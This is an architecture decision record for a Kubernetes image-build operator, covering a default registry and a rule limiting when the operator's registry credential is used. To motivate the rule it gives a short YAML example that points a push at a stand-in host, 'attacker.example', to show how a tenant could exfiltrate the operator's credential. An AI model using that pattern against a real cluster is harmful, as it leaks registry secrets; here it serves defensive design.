# 34. A default registry, and whose credential is used

Date: 2026-08-20

## Status

Accepted. Amends [0030](0030-a-real-registry-serves-both-kinds.md) and
[0031](0031-the-retention-guarantee.md), and depends on
[0033](0033-one-chart-one-namespace.md) for the single namespace that makes the credential shareable.

## Context

[0030](0030-a-real-registry-serves-both-kinds.md) made a registry the serving surface and
[0033](0033-one-chart-one-namespace.md) bundled one, enabled by default. That left a gap that made
the bundle pointless: nothing used it.

`spec.push.repository` was required and fully qualified, so every object had to name a host. A
registry installed by the chart, addressed by a Service DNS name the chart generates, would have to
be pasted into every `ImageComposition` and `ImageBuild` in the cluster — and re-pasted if the
release were renamed. A bundled registry nobody publishes to is a bundled registry that only costs
storage.

## Decision

**`push.repository` becomes optional. Omitted, an object publishes to the operator's default
registry**, configured once with `--default-registry`:

```
<default-registry>/<namespace>/<name>
```

On `ImageBuild`, `push` itself becomes optional too — a build with no `push` block at all publishes
to the default. It still always publishes to a *registry*: the Job runs in another pod and cannot
reach a loopback endpoint (0025). Only *which* registry moved out of the spec.

**Namespace-qualified, and not for tidiness.** One registry is now shared by the whole cluster, so a
bare object name collides the moment two namespaces both contain an `app`. The collision would be
silent — resolved by whichever object reconciled last, under a tag-conflict policy
([0029](0029-three-valued-tag-conflict-policy.md)) that would read it as a legitimate conflict rather
than as two unrelated objects landing on one name.

### The credential rule, which is the substance of this record

The default credential is a `dockerconfigjson` Secret read from **the controller's own namespace**,
not the object's. It belongs to the operator who installed the chart.

> **The operator's credential is used only when the object did not choose where its content goes.**

An object naming its own `repository` authenticates with its own `secretRef`, or anonymously. Never
with the operator's.

Without that rule the feature is a credential-exfiltration primitive. Anyone able to create an
`ImageComposition` — which is a namespaced, ordinary permission — writes:

```yaml
spec:
  push:
    repository: attacker.example/x
```

and the controller connects to a host the tenant chose and presents the operator's registry
password. Nothing about the request looks wrong: it is a well-formed push to a well-formed
reference, and it succeeds.

This is why the rule lives in one function, `DefaultRegistry.CredentialFor`, used by all three call
sites that authenticate — publishing, the tag-conflict pre-check, and the retention refresh. Three
independent implementations of a rule like this is three chances to get it wrong, and the third one
(refreshing) only *reads*, which is exactly the kind of reasoning that leads to an exception being
carved out. A credential sent to a host a tenant chose is exfiltrated whether the request that
carries it reads or writes.

### Reaching the registry

The chart generates the password, writes the htpasswd zot authenticates against and the
dockerconfigjson both controllers push with, and reuses the existing value on upgrade — a rotated
password would lock the controllers out of everything they had published.

zot is configured for **anonymous read, authenticated write**, which is the posture the embedded
serving endpoint had: a kubelet pulls without credentials, so anything else breaks image pulls.

**Workload pulls still need a node-resolvable name, and this record does not change that.** The
controllers reach the registry over cluster DNS; containerd resolves image references with the
*node's* resolver and cannot see cluster DNS. `registry.host` is what appears in
`status.artifact.ref`, and pointing it at the registry is the operator's job — an ingress, or a
NodePort plus a `certs.d` drop-in. The chart warns when it is unset, because the failure otherwise
appears as `ErrImagePull` against a Service that is perfectly healthy.

## Consequences

**A default install publishes somewhere real with no spec edits**, which is the point.

**`--default-registry` is operator configuration, so its absence is Pending, not Stalled.** An object
that names no repository when no default is configured waits. Stalling would need a generation change
to recover from, and the fix is a controller flag — nothing about the object is wrong.

**The security rule is one `usesDefault` boolean away from being wrong**, and it is not obviously
load-bearing when read. It is covered by a test that fails with the condition removed, and named
here so that a future reader deleting it as a redundant check has to argue with a record first.

**An explicit `secretRef` wins even on the default target.** The object asked for a specific
credential; substituting a more privileged one because it happens to be available is worse than
honouring what was written.

**BYO registries stay first-class.** `registry.enabled=false` with `defaultRegistry.host` and
`defaultRegistry.existingPushSecret` installs no zot and uses the operator's own registry and
credential, with the same rule applying to both.
